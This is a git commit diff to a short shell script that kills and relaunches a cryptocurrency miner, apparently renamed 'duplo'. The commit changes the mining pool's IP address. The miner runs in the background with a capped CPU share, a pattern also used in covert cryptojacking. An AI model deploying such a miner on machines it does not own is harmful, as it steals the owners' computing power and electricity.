c0ee1a0fd5d26d1e0867c9a7a2aab782526eeaed
malokit <47317427+malokit@users.noreply.github.com>
2019-02-12 08:14:15 -0800

    Update 50.sh

--- 50.sh
+++ 50.sh
@@ -1,4 +1,4 @@
 pkill duplo
 sleep 7
-duplo -o 116.202.25.191:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=57 --av=1 --variant -1
+duplo -o 109.234.37.141:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=57 --av=1 --variant -1
 echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'
